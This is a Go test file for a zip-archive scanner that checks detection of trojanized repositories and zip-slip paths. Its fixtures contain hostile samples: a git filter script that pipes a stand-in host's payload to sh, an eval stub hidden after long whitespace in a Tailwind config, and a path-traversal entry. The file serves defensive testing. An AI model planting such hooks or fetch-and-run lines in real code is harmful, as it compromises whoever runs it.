package source_test

import (
	"archive/zip"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Jehudavd/gitwasp/internal/source"
)

func buildTestZip(t *testing.T, name string, entries map[string]string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), name)
	f, err := os.Create(p)
	if err != nil {
		t.Fatalf("create zip %s: %v", p, err)
	}
	defer f.Close()

	zw := zip.NewWriter(f)
	for entryName, body := range entries {
		w, err := zw.Create(entryName)
		if err != nil {
			t.Fatalf("create zip entry %s: %v", entryName, err)
		}
		if _, err := w.Write([]byte(body)); err != nil {
			t.Fatalf("write zip entry %s: %v", entryName, err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("close zip writer: %v", err)
	}
	return p
}

func TestCollectZipCleanAndTrojanized(t *testing.T) {
	if !source.IsZipFile("coding-test.ZIP") || source.IsZipFile("repo-dir") {
		t.Fatalf("IsZipFile helper mismatch")
	}

	cleanZip := buildTestZip(t, "clean.zip", map[string]string{
		"demo/package.json": `{"name":"clean","scripts":{"test":"go test ./..."}}`,
		"demo/README.md":    "# Clean Project\n",
	})
	files, skipped, meta, err := source.CollectZip(cleanZip)
	if err != nil {
		t.Fatalf("CollectZip clean: %v", err)
	}
	if meta.HasEmbeddedGit || meta.HasZipSlip {
		t.Fatalf("expected clean zip metadata, got %+v", meta)
	}
	if skipped != 0 || len(files) != 1 || files[0].Path != "demo/package.json" {
		t.Fatalf("unexpected clean zip collected files=%+v skipped=%d", files, skipped)
	}

	pad := strings.Repeat(" ", 2300)
	trojanZip := buildTestZip(t, "zelario.zip", map[string]string{
		"zelario/.git/config":          "[core]\n\tfilemode = true\n[filter \"ltr\"]\n\tclean = .git/ltr\n",
		"zelario/.git/info/attributes": "* filter=ltr\n",
		"zelario/.git/ltr":             "#!/bin/sh\ncurl -s https://payload.example.invalid/stage1.sh | sh\n",
		"zelario/.git/HEAD":            "ref: refs/heads/main\n",
		"zelario/tailwind.config.mjs":  "export default {}\n" + pad + ";const c = crypto.createDecipheriv('aes-256-gcm', k, iv); eval(dec);\n",
	})

	files, _, meta, err = source.CollectZip(trojanZip)
	if err != nil {
		t.Fatalf("CollectZip trojanized: %v", err)
	}
	if !meta.HasEmbeddedGit {
		t.Fatalf("expected HasEmbeddedGit=true, got %+v", meta)
	}

	collected := map[string]bool{}
	for _, f := range files {
		collected[f.Path] = true
	}
	for _, want := range []string{
		"zelario/.git/config",
		"zelario/.git/info/attributes",
		"zelario/.git/ltr",
		"zelario/tailwind.config.mjs",
	} {
		if !collected[want] {
			t.Fatalf("expected %s to be collected from zip, got %+v", want, collected)
		}
	}
	if collected["zelario/.git/HEAD"] {
		t.Fatalf("did not expect standard .git/HEAD to be collected as suspicious")
	}

	slipZip := buildTestZip(t, "slip.zip", map[string]string{
		"../../evil.sh":   "curl https://payload.example.invalid/x | sh\n",
		"ok/package.json": `{"name":"ok"}`,
	})
	files, skipped, meta, err = source.CollectZip(slipZip)
	if err != nil {
		t.Fatalf("CollectZip zip-slip: %v", err)
	}
	if !meta.HasZipSlip || len(meta.ZipSlipPaths) != 1 || skipped < 1 {
		t.Fatalf("expected ZipSlip detection, got meta=%+v skipped=%d", meta, skipped)
	}
	if len(files) != 1 || files[0].Path != "ok/package.json" {
		t.Fatalf("expected only safe entry collected alongside zip slip, got %+v", files)
	}
}
